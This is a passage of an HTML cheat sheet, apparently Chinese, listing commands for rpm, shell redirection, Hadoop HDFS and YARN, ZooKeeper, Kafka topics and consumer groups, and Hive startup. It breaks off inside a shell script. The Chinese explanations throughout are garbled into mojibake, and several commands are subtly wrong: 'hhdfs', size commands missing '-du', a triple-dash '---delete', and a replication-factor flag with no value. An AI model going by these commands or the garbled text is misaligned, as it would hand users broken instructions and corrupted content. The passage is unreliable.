fxxxxxx.rpmï¼ˆâ€“nodepsï¼Œä¸æ£€æµ‹ä¾èµ–è¿›åº¦ï¼‰</p><table><thead><tr><th>é€‰é¡¹</th><th>åŠŸèƒ½</th></tr></thead><tbody><tr><td>-i</td><td>-i=installï¼Œå®‰è£…</td></tr><tr><td>-v</td><td>-v=verboseï¼Œæ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯</td></tr><tr><td>-h</td><td>-h=hashï¼Œè¿›åº¦æ¡</td></tr><tr><td>â€“nodeps</td><td>â€“nodepsï¼Œä¸æ£€æµ‹ä¾èµ–è¿›åº¦</td></tr></tbody></table><hr><h2 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h2><h3 id="è¾“å…¥-è¾“å‡ºé‡å®šå‘"><a href="#è¾“å…¥-è¾“å‡ºé‡å®šå‘" class="headerlink" title="è¾“å…¥/è¾“å‡ºé‡å®šå‘"></a>è¾“å…¥/è¾“å‡ºé‡å®šå‘</h3><table><thead><tr><th>å‘½ä»¤</th><th>åŠŸèƒ½è¯´æ˜</th></tr></thead><tbody><tr><td>command &gt; file</td><td>å°†è¾“å‡ºé‡å®šå‘åˆ° file</td></tr><tr><td>command &lt; file</td><td>å°†è¾“å…¥é‡å®šå‘åˆ° file</td></tr><tr><td>command &gt;&gt; file</td><td>å°†è¾“å‡ºä»¥è¿½åŠ çš„æ–¹å¼é‡å®šå‘åˆ° file</td></tr><tr><td>n &gt; file</td><td>å°†æ–‡ä»¶æè¿°ç¬¦ä¸º n çš„æ–‡ä»¶é‡å®šå‘åˆ° file</td></tr><tr><td>n &gt;&gt; file</td><td>å°†æ–‡ä»¶æè¿°ç¬¦ä¸º n çš„æ–‡ä»¶ä»¥è¿½åŠ çš„æ–¹å¼é‡å®šå‘åˆ° file</td></tr><tr><td>n &gt;&amp; m</td><td>å°†è¾“å‡ºæ–‡ä»¶ m å’Œ n åˆå¹¶</td></tr><tr><td>n &lt;&amp; m</td><td>å°†è¾“å…¥æ–‡ä»¶ m å’Œ n åˆå¹¶</td></tr><tr><td>&lt;&lt; tag</td><td>å°†å¼€å§‹æ ‡è®° tag å’Œç»“æŸæ ‡è®° tag ä¹‹é—´çš„å†…å®¹ä½œä¸ºè¾“å…¥</td></tr></tbody></table><h3 id="è„šæœ¬ç¼–è¾‘"><a href="#è„šæœ¬ç¼–è¾‘" class="headerlink" title="è„šæœ¬ç¼–è¾‘"></a>è„šæœ¬ç¼–è¾‘</h3><table><thead><tr><th>å¿«æ·æ–¹å¼</th><th>åŠŸèƒ½è¯´æ˜</th></tr></thead><tbody><tr><td>shift</td><td>å‚æ•°å·¦ç§»</td></tr><tr><td>$@</td><td>æ‰€æœ‰çš„å‚æ•°</td></tr><tr><td>$#</td><td>å‚æ•°çš„ä¸ªæ•°</td></tr></tbody></table><hr><h2 id="Hadoop"><a href="#Hadoop" class="headerlink" title="Hadoop"></a>Hadoop</h2><h3 id="å¯åŠ¨ç±»å‘½ä»¤"><a href="#å¯åŠ¨ç±»å‘½ä»¤" class="headerlink" title="å¯åŠ¨ç±»å‘½ä»¤"></a>å¯åŠ¨ç±»å‘½ä»¤</h3><table><thead><tr><th>åŠŸèƒ½è¯´æ˜</th><th>å‘½ä»¤è„šæœ¬</th></tr></thead><tbody><tr><td>å¯åŠ¨hdfsé›†ç¾¤</td><td>sbin/start-dfs.sh</td></tr><tr><td>å¯åŠ¨yarn</td><td>sbin/start-yarn.sh</td></tr></tbody></table><h3 id="hadoop-fs-hdfs-dfs-å‘½ä»¤"><a href="#hadoop-fs-hdfs-dfs-å‘½ä»¤" class="headerlink" title="hadoop fs/hdfs dfs å‘½ä»¤"></a>hadoop fs/hdfs dfs å‘½ä»¤</h3><table><thead><tr><th>åŠŸèƒ½è¯´æ˜</th><th>å‘½ä»¤</th></tr></thead><tbody><tr><td>åˆ›å»ºç›®å½•</td><td>hdfs dfs -mkdir -p /data/flink</td></tr><tr><td>æ˜¾ç¤ºç›®å½•</td><td>hdfs dfs -ls /</td></tr><tr><td>ä»HDFSæ‹·è´åˆ°æœ¬åœ°</td><td>hdfs dfs -copyToLocal /data/data.txt ./</td></tr><tr><td>æ–‡ä»¶ä¸Šä¼ åˆ°é›†ç¾¤(ä»æœ¬åœ°)</td><td>hhdfs dfs -copyFromLocal data.txt /</td></tr><tr><td>æ–‡ä»¶ä¸‹è½½</td><td>hdfs dfs -get /data/flink</td></tr><tr><td>åˆ é™¤é›†ç¾¤çš„æ–‡ä»¶</td><td>hdfs dfs -rm /data/flink</td></tr><tr><td>åˆ é™¤æ–‡ä»¶å¤¹</td><td>hdfs dfs -rm -r -skipTrash /data</td></tr><tr><td>ä»æœ¬åœ°å‰ªåˆ‡ç²˜è´´åˆ°HDFS</td><td>hdfs dfs Â -moveFromLocal data.txt /data/</td></tr><tr><td>è¿½åŠ ä¸€ä¸ªæ–‡ä»¶åˆ°å·²ç»å­˜åœ¨çš„æ–‡ä»¶æœ«å°¾hdfs dfs -appendToFile data1.txt /data/data.txt</td><td></td></tr><tr><td>æ˜¾ç¤ºæ–‡ä»¶å†…å®¹</td><td>hdfs dfs -cat data.txt</td></tr><tr><td>ä¿®æ”¹æ–‡ä»¶æ‰€å±æƒé™</td><td>hdfs dfs Â -chmod Â 777 xxx.sh</td></tr><tr><td>ä¿®æ”¹æ–‡ä»¶æ‰€å±ç”¨æˆ·ç»„</td><td>hdfs dfs Â -chown Â root:root data.txt</td></tr><tr><td>ä»HDFSçš„ä¸€ä¸ªè·¯å¾„æ‹·è´åˆ°HDFSçš„å¦ä¸€ä¸ªè·¯å¾„</td><td>hdfs dfs -cp data.txt /data1.txt</td></tr><tr><td>åœ¨HDFSç›®å½•ä¸­ç§»åŠ¨æ–‡ä»¶</td><td>hdfs dfs -mv data.txt /opt/</td></tr><tr><td>åˆå¹¶ä¸‹è½½å¤šä¸ªæ–‡ä»¶</td><td>hdfs dfs Â -getmerge /data/* ./data_merge.txt</td></tr><tr><td>hadoop fs -put</td><td>ç­‰åŒäºcopyFromLocal</td></tr><tr><td>æ˜¾ç¤ºä¸€ä¸ªæ–‡ä»¶çš„æœ«å°¾</td><td>hdfs dfs -tail data.txt</td></tr><tr><td>åˆ é™¤æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹</td><td>hdfs dfs -rm /data/data.txt</td></tr><tr><td>åˆ é™¤ç©ºç›®å½•</td><td>hdfs dfs -rmdir /data</td></tr><tr><td>ç»Ÿè®¡æ–‡ä»¶å¤¹çš„å¤§å°ä¿¡æ¯</td><td>hdfs dfs -s -h /data</td></tr><tr><td>ç»Ÿè®¡æ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶å¤§å°ä¿¡æ¯</td><td>hdfs dfs Â -h /data</td></tr><tr><td>è®¾ç½®HDFSä¸­æ–‡ä»¶çš„å‰¯æœ¬æ•°é‡</td><td>hdfs dfs -setrep 3 /data/data.txt</td></tr></tbody></table><h3 id="yarnå‘½ä»¤"><a href="#yarnå‘½ä»¤" class="headerlink" title="yarnå‘½ä»¤"></a>yarnå‘½ä»¤</h3><table><thead><tr><th>åŠŸèƒ½è¯´æ˜</th><th>å‘½ä»¤</th></tr></thead><tbody><tr><td>æŸ¥çœ‹æ­£åœ¨è¿è¡Œçš„yarnä»»åŠ¡åˆ—è¡¨</td><td>yarn application -list appID</td></tr><tr><td>killæ‰æŒ‡å®šidçš„yarnä»»åŠ¡</td><td>yarn application -kill appID</td></tr><tr><td>æŸ¥çœ‹ä»»åŠ¡æ—¥å¿—ä¿¡æ¯</td><td>yarn logs -applicationId appID</td></tr></tbody></table><hr><h2 id="Zookeeper"><a href="#Zookeeper" class="headerlink" title="Zookeeper"></a>Zookeeper</h2><h3 id="å¯åŠ¨å‘½ä»¤"><a href="#å¯åŠ¨å‘½ä»¤" class="headerlink" title="å¯åŠ¨å‘½ä»¤"></a>å¯åŠ¨å‘½ä»¤</h3><table><thead><tr><th>åŠŸèƒ½è¯´æ˜</th><th>å‘½ä»¤è„šæœ¬</th></tr></thead><tbody><tr><td>å¯åŠ¨zookeeperæœåŠ¡</td><td>zkServer.sh start</td></tr><tr><td>æŸ¥çœ‹zookeeperçŠ¶æ€</td><td>zkServer.sh status</td></tr><tr><td>åœæ­¢zookeeperæœåŠ¡</td><td>zkServer.sh stop</td></tr><tr><td>å¯åŠ¨zookeeperå®¢æˆ·ç«¯</td><td>zkCli.sh -server 127.0.0.1:2181</td></tr><tr><td>é€€å‡ºzookeeperå®¢æˆ·ç«¯</td><td>quit</td></tr></tbody></table><h3 id="åŸºæœ¬æ“ä½œ"><a href="#åŸºæœ¬æ“ä½œ" class="headerlink" title="åŸºæœ¬æ“ä½œ"></a>åŸºæœ¬æ“ä½œ</h3><table><thead><tr><th>åŠŸèƒ½è¯´æ˜</th><th>å‘½ä»¤è„šæœ¬</th></tr></thead><tbody><tr><td>å½“å‰znodeä¸­æ‰€åŒ…å«çš„å†…å®¹</td><td>ls /</td></tr><tr><td>åˆ›å»ºæ™®é€šèŠ‚ç‚¹(å‰é¢æ˜¯èŠ‚ç‚¹çš„è·¯å¾„ï¼Œåé¢æ˜¯å€¼ï¼‰</td><td>create /bigdata/flink â€œflinkâ€</td></tr><tr><td>è·å–èŠ‚ç‚¹çš„å€¼</td><td>get /bigdata</td></tr><tr><td>ä¿®æ”¹èŠ‚ç‚¹çš„å€¼</td><td>set /bigdata/flink â€œflinksqlâ€</td></tr><tr><td>åˆ é™¤èŠ‚ç‚¹</td><td>delete /bigdata/flink</td></tr><tr><td>é€’å½’åˆ é™¤èŠ‚ç‚¹</td><td>rmr /bigdata</td></tr></tbody></table><h3 id="å››å­—æ¯å‘½ä»¤"><a href="#å››å­—æ¯å‘½ä»¤" class="headerlink" title="å››å­—æ¯å‘½ä»¤"></a>å››å­—æ¯å‘½ä»¤</h3><table><thead><tr><th>å‘½ä»¤</th><th>åŠŸèƒ½è¯´æ˜</th><th>ä¾‹å­</th></tr></thead><tbody><tr><td>conf</td><td>zkæœåŠ¡é…ç½®çš„è¯¦ç»†ä¿¡æ¯</td><td>echo conf</td></tr><tr><td>stat</td><td>å®¢æˆ·ç«¯ä¸zkè¿æ¥çš„ç®€è¦ä¿¡æ¯</td><td>å‚è€ƒä¸Šé¢</td></tr><tr><td>srvr</td><td>zkæœåŠ¡çš„è¯¦ç»†ä¿¡æ¯</td><td>å‚è€ƒä¸Šé¢</td></tr><tr><td>cons</td><td>å®¢æˆ·ç«¯ä¸zkè¿æ¥çš„è¯¦ç»†ä¿¡æ¯</td><td>å‚è€ƒä¸Šé¢</td></tr><tr><td>mntr</td><td>zkæœåŠ¡ç›®å‰çš„æ€§èƒ½çŠ¶å†µ</td><td>å‚è€ƒä¸Šé¢</td></tr><tr><td>crst</td><td>é‡ç½®å½“å‰çš„æ‰€æœ‰è¿æ¥ã€ä¼šè¯</td><td>å‚è€ƒä¸Šé¢</td></tr><tr><td>dump</td><td>åˆ—å‡ºæœªç»å¤„ç†çš„ä¼šè¯å’Œè¿æ¥ä¿¡æ¯</td><td>å‚è€ƒä¸Šé¢</td></tr><tr><td>envi</td><td>åˆ—å‡ºzkçš„ç‰ˆæœ¬ä¿¡æ¯ã€ä¸»æœºåç§°ã€Javaç‰ˆæœ¬ã€æœåŠ¡å™¨åç§°ç­‰ç­‰</td><td>å‚è€ƒä¸Šé¢</td></tr><tr><td>ruok</td><td>æµ‹è¯•æœåŠ¡å™¨æ˜¯å¦æ­£åœ¨è¿è¡Œï¼Œå¦‚æœåœ¨è¿è¡Œè¿”å›imokï¼Œå¦åˆ™è¿”å›ç©º</td><td>å‚è€ƒä¸Šé¢</td></tr><tr><td>srst</td><td>é‡ç½®Zookeeperçš„æ‰€æœ‰ç»Ÿè®¡ä¿¡æ¯</td><td>å‚è€ƒä¸Šé¢</td></tr><tr><td>wchs</td><td>åˆ—å‡ºwatchçš„æ€»æ•°ï¼Œè¿æ¥æ•°</td><td>å‚è€ƒä¸Šé¢</td></tr><tr><td>wchp</td><td>åˆ—å‡ºæ‰€æœ‰watchçš„è·¯å¾„åŠsessionID</td><td>å‚è€ƒä¸Šé¢</td></tr><tr><td>mntr</td><td>åˆ—å‡ºé›†ç¾¤çš„å…³é”®æ€§èƒ½æ•°æ®ï¼ŒåŒ…æ‹¬zkçš„ç‰ˆæœ¬ã€nodeæ•°é‡ã€ä¸´æ—¶èŠ‚ç‚¹æ•°ç­‰ç­‰</td><td>å‚è€ƒä¸Šé¢</td></tr></tbody></table><hr><h2 id="Kafka"><a href="#Kafka" class="headerlink" title="Kafka"></a>Kafka</h2><p><strong>æ³¨:</strong> è¿™é‡Œæœºå™¨æˆ‘åªå†™ä¸€ä¸ªã€‚å‘½ä»¤ä½ ä»¬ä¹Ÿå¯ä½¿ç”¨ ./bin/xx.sh (å¦‚ï¼š./bin/kafka-topics.sh)</p><h3 id="æŸ¥çœ‹å½“å‰æœåŠ¡å™¨ä¸­çš„æ‰€æœ‰topic"><a href="#æŸ¥çœ‹å½“å‰æœåŠ¡å™¨ä¸­çš„æ‰€æœ‰topic" class="headerlink" title="æŸ¥çœ‹å½“å‰æœåŠ¡å™¨ä¸­çš„æ‰€æœ‰topic"></a>æŸ¥çœ‹å½“å‰æœåŠ¡å™¨ä¸­çš„æ‰€æœ‰topic</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kafka-topics --zookeeper xxxxxx:2181 --list --exclude-internal </span><br><span class="line"></span><br><span class="line">è¯´æ˜ï¼š</span><br><span class="line"></span><br><span class="line">exclude-internalï¼šæ’é™¤kafkaå†…éƒ¨topic</span><br><span class="line"></span><br><span class="line">æ¯”å¦‚ï¼š --exclude-internal  --topic &quot;test_.*&quot;</span><br></pre></td></tr></table></figure><h3 id="åˆ›å»ºtopic"><a href="#åˆ›å»ºtopic" class="headerlink" title="åˆ›å»ºtopic"></a>åˆ›å»ºtopic</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">kafka-topics --zookeeper xxxxxx:2181  --create </span><br><span class="line">--replication-factor </span><br><span class="line">--partitions 1 </span><br><span class="line">--topic topic_name</span><br><span class="line"></span><br><span class="line">è¯´æ˜ï¼š</span><br><span class="line"></span><br><span class="line">--topic å®šä¹‰topicå</span><br><span class="line"></span><br><span class="line">--replication-factor  å®šä¹‰å‰¯æœ¬æ•°</span><br><span class="line"></span><br><span class="line">--partitions  å®šä¹‰åˆ†åŒºæ•°</span><br></pre></td></tr></table></figure><h3 id="åˆ é™¤topic"><a href="#åˆ é™¤topic" class="headerlink" title="åˆ é™¤topic"></a>åˆ é™¤topic</h3><p><strong>æ³¨æ„:</strong> éœ€è¦server.propertiesä¸­è®¾ç½®delete.topic.enable=trueå¦åˆ™åªæ˜¯æ ‡è®°åˆ é™¤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kafka-topics --zookeeper xxxxxx:2181 --delete --topic topic_name</span><br></pre></td></tr></table></figure><h3 id="ç”Ÿäº§è€…"><a href="#ç”Ÿäº§è€…" class="headerlink" title="ç”Ÿäº§è€…"></a>ç”Ÿäº§è€…</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kafka-console-producer --broker-list xxxxxx:9092 --topic topic_name</span><br><span class="line"></span><br><span class="line">å¯åŠ ï¼š--property parse.key=trueï¼ˆæœ‰keyæ¶ˆæ¯ï¼‰</span><br></pre></td></tr></table></figure><h3 id="æ¶ˆè´¹è€…"><a href="#æ¶ˆè´¹è€…" class="headerlink" title="æ¶ˆè´¹è€…"></a>æ¶ˆè´¹è€…</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">kafka-console-consumer --bootstrap-server xxxxxx:9092 --topic topic_name</span><br><span class="line"></span><br><span class="line">æ³¨ï¼šå¯é€‰</span><br><span class="line"></span><br><span class="line">--from-beginningï¼šä¼šæŠŠä¸»é¢˜ä¸­ä»¥å¾€æ‰€æœ‰çš„æ•°æ®éƒ½è¯»å–å‡ºæ¥</span><br><span class="line"></span><br><span class="line">--whitelist &#x27;.*&#x27; ï¼šæ¶ˆè´¹æ‰€æœ‰çš„topic</span><br><span class="line"></span><br><span class="line">--property print.key=trueï¼šæ˜¾ç¤ºkeyè¿›è¡Œæ¶ˆè´¹</span><br><span class="line"></span><br><span class="line">--partition 0ï¼šæŒ‡å®šåˆ†åŒºæ¶ˆè´¹</span><br><span class="line"></span><br><span class="line">--offsetï¼šæŒ‡å®šèµ·å§‹åç§»é‡æ¶ˆè´¹</span><br></pre></td></tr></table></figure><h3 id="æŸ¥çœ‹æŸä¸ªTopicçš„è¯¦æƒ…"><a href="#æŸ¥çœ‹æŸä¸ªTopicçš„è¯¦æƒ…" class="headerlink" title="æŸ¥çœ‹æŸä¸ªTopicçš„è¯¦æƒ…"></a>æŸ¥çœ‹æŸä¸ªTopicçš„è¯¦æƒ…</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kafka-topics --zookeeper xxxxxx:2181 --describe --topic topic_name</span><br></pre></td></tr></table></figure><h3 id="ä¿®æ”¹åˆ†åŒºæ•°"><a href="#ä¿®æ”¹åˆ†åŒºæ•°" class="headerlink" title="ä¿®æ”¹åˆ†åŒºæ•°"></a>ä¿®æ”¹åˆ†åŒºæ•°</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kafka-topics --zookeeper xxxxxx:2181 --alter --topic topic_name --partitions 6</span><br></pre></td></tr></table></figure><h3 id="æŸ¥çœ‹æŸä¸ªæ¶ˆè´¹è€…ç»„ä¿¡æ¯"><a href="#æŸ¥çœ‹æŸä¸ªæ¶ˆè´¹è€…ç»„ä¿¡æ¯" class="headerlink" title="æŸ¥çœ‹æŸä¸ªæ¶ˆè´¹è€…ç»„ä¿¡æ¯"></a>æŸ¥çœ‹æŸä¸ªæ¶ˆè´¹è€…ç»„ä¿¡æ¯</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kafka-consumer-groups --bootstrap-server  xxxxxx:9092  --describe --group group_name</span><br></pre></td></tr></table></figure><h3 id="åˆ é™¤æ¶ˆè´¹è€…ç»„"><a href="#åˆ é™¤æ¶ˆè´¹è€…ç»„" class="headerlink" title="åˆ é™¤æ¶ˆè´¹è€…ç»„"></a>åˆ é™¤æ¶ˆè´¹è€…ç»„</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kafka-consumer-groups --bootstrap-server  xxxxxx:9092  ---delete --group group_name</span><br></pre></td></tr></table></figure><h3 id="é‡ç½®offset"><a href="#é‡ç½®offset" class="headerlink" title="é‡ç½®offset"></a>é‡ç½®offset</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kafka-consumer-groups --bootstrap-server  xxxxxx:9092  --group group_name</span><br><span class="line"></span><br><span class="line">--reset-offsets --all-topics --to-latest --execute</span><br></pre></td></tr></table></figure><h3 id="leaderé‡æ–°é€‰ä¸¾"><a href="#leaderé‡æ–°é€‰ä¸¾" class="headerlink" title="leaderé‡æ–°é€‰ä¸¾"></a>leaderé‡æ–°é€‰ä¸¾</h3><p>æŒ‡å®šTopicæŒ‡å®šåˆ†åŒºç”¨é‡æ–°PREFERREDï¼šä¼˜å…ˆå‰¯æœ¬ç­–ç•¥ è¿›è¡ŒLeaderé‡é€‰ä¸¾</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kafka-leader-election --bootstrap-server xxxxxx:9092 </span><br><span class="line">--topic topic_name --election-type PREFERRED --partition 0</span><br></pre></td></tr></table></figure><p>æ‰€æœ‰Topicæ‰€æœ‰åˆ†åŒºç”¨é‡æ–°PREFERREDï¼šä¼˜å…ˆå‰¯æœ¬ç­–ç•¥ è¿›è¡ŒLeaderé‡é€‰ä¸¾</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kafka-leader-election --bootstrap-server xxxxxx:9092 </span><br><span class="line">--election-type preferred  --all-topic-partitions</span><br></pre></td></tr></table></figure><h3 id="æŸ¥è¯¢kafkaç‰ˆæœ¬ä¿¡æ¯"><a href="#æŸ¥è¯¢kafkaç‰ˆæœ¬ä¿¡æ¯" class="headerlink" title="æŸ¥è¯¢kafkaç‰ˆæœ¬ä¿¡æ¯"></a>æŸ¥è¯¢kafkaç‰ˆæœ¬ä¿¡æ¯</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kafka-configs --bootstrap-server xxxxxx:9092</span><br><span class="line">--describe --version</span><br></pre></td></tr></table></figure><h3 id="å¢åˆ æ”¹é…ç½®"><a href="#å¢åˆ æ”¹é…ç½®" class="headerlink" title="å¢åˆ æ”¹é…ç½®"></a>å¢åˆ æ”¹é…ç½®</h3><table><thead><tr><th>åŠŸèƒ½è¯´æ˜</th><th>å‚æ•°</th></tr></thead><tbody><tr><td>é€‰æ‹©ç±»å‹</td><td>â€“entity-type (topics/clients/users/brokers/broker- loggers)</td></tr><tr><td>ç±»å‹åç§°</td><td>â€“entity-name</td></tr><tr><td>åˆ é™¤é…ç½®</td><td>â€“delete-config k1=v1,k2=v2</td></tr><tr><td>æ·»åŠ /ä¿®æ”¹é…ç½®</td><td>â€“add-config k1,k2</td></tr></tbody></table><p>topicæ·»åŠ /ä¿®æ”¹åŠ¨æ€é…ç½®</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kafka-configs --bootstrap-server xxxxxx:9092</span><br><span class="line">--alter --entity-type topics --entity-name topic_name </span><br><span class="line">--add-config file.delete.delay.ms=222222,retention.ms=999999</span><br></pre></td></tr></table></figure><p>topicåˆ é™¤åŠ¨æ€é…ç½®</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kafka-configs --bootstrap-server xxxxxx:9092 </span><br><span class="line">--alter --entity-type topics --entity-name topic_name </span><br><span class="line">--delete-config file.delete.delay.ms,retention.ms</span><br></pre></td></tr></table></figure><h3 id="æŒç»­æ‰¹é‡æ‹‰å–æ¶ˆæ¯"><a href="#æŒç»­æ‰¹é‡æ‹‰å–æ¶ˆæ¯" class="headerlink" title="æŒç»­æ‰¹é‡æ‹‰å–æ¶ˆæ¯"></a>æŒç»­æ‰¹é‡æ‹‰å–æ¶ˆæ¯</h3><p>å•æ¬¡æœ€å¤§æ¶ˆè´¹10æ¡æ¶ˆæ¯(ä¸åŠ å‚æ•°æ„ä¸ºæŒç»­æ¶ˆè´¹)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kafka-verifiable-consumer --bootstrap-server xxxxxx:9092 </span><br><span class="line">--group group_name</span><br><span class="line">--topic topic_name --max-messages 10</span><br></pre></td></tr></table></figure><h3 id="åˆ é™¤æŒ‡å®šåˆ†åŒºçš„æ¶ˆæ¯"><a href="#åˆ é™¤æŒ‡å®šåˆ†åŒºçš„æ¶ˆæ¯" class="headerlink" title="åˆ é™¤æŒ‡å®šåˆ†åŒºçš„æ¶ˆæ¯"></a>åˆ é™¤æŒ‡å®šåˆ†åŒºçš„æ¶ˆæ¯</h3><p>åˆ é™¤æŒ‡å®štopicçš„æŸä¸ªåˆ†åŒºçš„æ¶ˆæ¯åˆ é™¤è‡³offsetä¸º1024</p><p>jsonæ–‡ä»¶offset-json-file.json</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;partitions&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;topic&quot;: &quot;topic_name&quot;,</span><br><span class="line">            &quot;partition&quot;: 0,</span><br><span class="line">            &quot;offset&quot;: 1024</span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">    &quot;version&quot;: 1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kafka-delete-records --bootstrap-server xxxxxx:9092 </span><br><span class="line">--offset-json-file offset-json-file.json</span><br></pre></td></tr></table></figure><h3 id="æŸ¥çœ‹Brokerç£ç›˜ä¿¡æ¯"><a href="#æŸ¥çœ‹Brokerç£ç›˜ä¿¡æ¯" class="headerlink" title="æŸ¥çœ‹Brokerç£ç›˜ä¿¡æ¯"></a>æŸ¥çœ‹Brokerç£ç›˜ä¿¡æ¯</h3><p>æŸ¥è¯¢æŒ‡å®štopicç£ç›˜ä¿¡æ¯</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kafka-log-dirs --bootstrap-server xxxxxx:9090 </span><br><span class="line">--describe --topic-list topic1,topic2</span><br></pre></td></tr></table></figure><p>æŸ¥è¯¢æŒ‡å®šBrokerç£ç›˜ä¿¡æ¯</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kafka-log-dirs --bootstrap-server xxxxxx:9090 </span><br><span class="line">--describe --topic-list topic1 --broker-list 0</span><br></pre></td></tr></table></figure><h2 id="Hive"><a href="#Hive" class="headerlink" title="Hive"></a>Hive</h2><h3 id="å¯åŠ¨ç±»"><a href="#å¯åŠ¨ç±»" class="headerlink" title="å¯åŠ¨ç±»"></a>å¯åŠ¨ç±»</h3><table><thead><tr><th>åŠŸèƒ½è¯´æ˜</th><th>å‘½ä»¤</th></tr></thead><tbody><tr><td>å¯åŠ¨hiveserver2æœåŠ¡</td><td>bin/hiveserver2</td></tr><tr><td>å¯åŠ¨beeline</td><td>bin/beeline</td></tr><tr><td>è¿æ¥hiveserver2</td><td>beeline&gt; !connect jdbc:hive2://hadoop102:10000</td></tr><tr><td>metastroeæœåŠ¡</td><td>bin/hive â€“service metastore</td></tr></tbody></table><p>hive å¯åŠ¨å…ƒæ•°æ®æœåŠ¡ï¼ˆmetastoreå’Œhiveserver2ï¼‰å’Œä¼˜é›…å…³é—­è„šæœ¬</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">å¯åŠ¨ï¼š hive.sh start</span><br><span class="line">å…³é—­ï¼š hive.sh stop</span><br><span class="line">é‡å¯ï¼š hive.sh restart</span><br><span class="line">çŠ¶æ€ï¼š hive.sh status</span><br></pre></td></tr></table></figure><p>è„šæœ¬å¦‚ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">HIVE_LOG_DIR=$HIVE_HOME/logs</span><br><span class="line"></span><br><span class="line">mkdir -p $HIVE_LOG_DIR</span><br><span 